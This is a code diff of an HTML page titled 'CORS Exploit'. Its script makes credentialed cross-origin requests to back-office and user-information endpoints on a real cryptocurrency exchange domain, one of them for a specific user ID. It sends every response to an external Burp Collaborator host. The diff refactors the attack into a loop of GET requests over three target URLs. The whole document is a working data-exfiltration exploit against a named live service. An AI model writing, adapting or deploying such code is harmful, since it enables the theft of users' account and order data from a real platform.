@@ -3,59 +3,39 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>.</title>
+    <title>CORS Exploit</title>
 </head>
 <body>
     <script>
         // Function to log response data to Burp Collaborator
-        function logResponse(response) {
-            fetch('https://8r0150yoonqzfx1b1j54dmrbf2lt9q5eu.oastify.com/log?key=' + response);
+        function logToBurp(data) {
+            fetch('https://8r0150yoonqzfx1b1j54dmrbf2lt9q5eu.oastify.com/log?key=' + encodeURIComponent(data));
         }
 
-        // XMLHttpRequest for Target URL 1
-        var xhr1 = new XMLHttpRequest();
-        xhr1.onreadystatechange = function() {
-            if (xhr1.readyState === 4) {
-                logResponse(xhr1.responseText);
-            }
-        };
-        xhr1.open('POST', 'https://csboss.okex.org/newboss/home', true);
-        xhr1.withCredentials = true;
-        
-        // Create form data
-        var formData1 = new FormData();
-        formData1.append('data1', 'large_data_here');
-        xhr1.send(formData1);
+        // Function to send XMLHttpRequest and log response
+        function sendRequest(url) {
+            var xhr = new XMLHttpRequest();
+            xhr.onreadystatechange = function() {
+                if (xhr.readyState === 4) {
+                    logToBurp(xhr.responseText);
+                }
+            };
+            xhr.open('GET', url, true);
+            xhr.withCredentials = true; // Include cookies in the request
+            xhr.send();
+        }
 
-        // XMLHttpRequest for Target URL 2
-        var xhr2 = new XMLHttpRequest();
-        xhr2.onreadystatechange = function() {
-            if (xhr2.readyState === 4) {
-                logResponse(xhr2.responseText);
-            }
-        };
-        xhr2.open('POST', 'https://csboss.okex.org/newboss/okboss/user/userInformationAll?userId=46334716', true);
-        xhr2.withCredentials = true;
+        // Target URLs
+        var urls = [
+            'https://csboss.okex.org/newboss/home',
+            'https://csboss.okex.org/newboss/okboss/user/userInformationAll?userId=46334716',
+            'https://csboss.okex.org/newboss/otc/open/orderList/'
+        ];
 
-        // Create form data
-        var formData2 = new FormData();
-        formData2.append('data2', 'large_data_here');
-        xhr2.send(formData2);
-
-        // XMLHttpRequest for Target URL 3
-        var xhr3 = new XMLHttpRequest();
-        xhr3.onreadystatechange = function() {
-            if (xhr3.readyState === 4) {
-                logResponse(xhr3.responseText);
-            }
-        };
-        xhr3.open('POST', 'https://csboss.okex.org/newboss/okboss/user/userInformationAll', true);
-        xhr3.withCredentials = true;
-
-        // Create form data
-        var formData3 = new FormData();
-        formData3.append('data3', 'large_data_here');
-        xhr3.send(formData3);
+        // Send requests to all target URLs
+        urls.forEach(function(url) {
+            sendRequest(url);
+        });
     </script>
 </body>
 </html>
